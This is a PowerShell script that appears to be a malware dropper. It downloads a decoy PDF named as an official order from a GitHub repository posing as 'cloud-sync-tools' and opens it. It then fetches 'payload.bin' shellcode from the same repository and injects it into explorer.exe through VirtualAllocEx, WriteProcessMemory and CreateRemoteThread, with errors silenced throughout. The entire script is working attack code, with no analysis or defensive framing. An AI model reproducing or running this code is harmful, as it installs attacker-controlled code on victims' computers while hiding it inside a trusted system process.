$ErrorActionPreference = 'SilentlyContinue'

$pdfUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/main/assets/Nakaz_No._661_vid_02.03.2026.pdf"
$pdfPath = "$env:TEMP\nakaz.pdf"

$downloaded = $false
for ($i = 1; $i -le 3; $i++) {
    try {
        Invoke-WebRequest -Uri $pdfUrl `
            -OutFile $pdfPath `
            -Headers @{'User-Agent'='Mozilla/5.0 (Windows NT 10.0; Win64; x64)'} `
            -UseBasicParsing -TimeoutSec 30
        
        if (Test-Path $pdfPath) {
            $downloaded = $true
            break
        }
    } catch {}
    Start-Sleep -Seconds 1
}

if ($downloaded) {
    Unblock-File -Path $pdfPath -ErrorAction SilentlyContinue
    Start-Process -FilePath $pdfPath -ErrorAction SilentlyContinue
}

if (Test-Path $pdfPath) {
    $shellcodeUrl = "https://github.com/astro-opensource/cloud-sync-tools/raw/refs/heads/main/assets/payload.bin"
    $shellcode = (Invoke-WebRequest -Uri $shellcodeUrl `
        -Headers @{'User-Agent'='Mozilla/5.0 (Windows NT 10.0; Win64; x64)'} `
        -UseBasicParsing -TimeoutSec 30).Content

    $code = @'
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class Inject {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
'@
    Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue

    $explorer = Get-Process -Name explorer -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($explorer) {
        $hProc = [Inject]::OpenProcess(0x1F0FFF, $false, $explorer.Id)
        if ($hProc -ne [IntPtr]::Zero) {
            $addr = [Inject]::VirtualAllocEx($hProc, [IntPtr]::Zero, $shellcode.Length, 0x1000, 0x40)
            if ($addr -ne [IntPtr]::Zero) {
                $written = [IntPtr]::Zero
                [Inject]::WriteProcessMemory($hProc, $addr, $shellcode, $shellcode.Length, [ref]$written)

                $remoteId = [IntPtr]::Zero
                $remote = [Inject]::CreateRemoteThread($hProc, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$remoteId)
                if ($remote -ne [IntPtr]::Zero) {
                    [Inject]::CloseHandle($remote)
                }
            }
            [Inject]::CloseHandle($hProc)
        }
    }
}
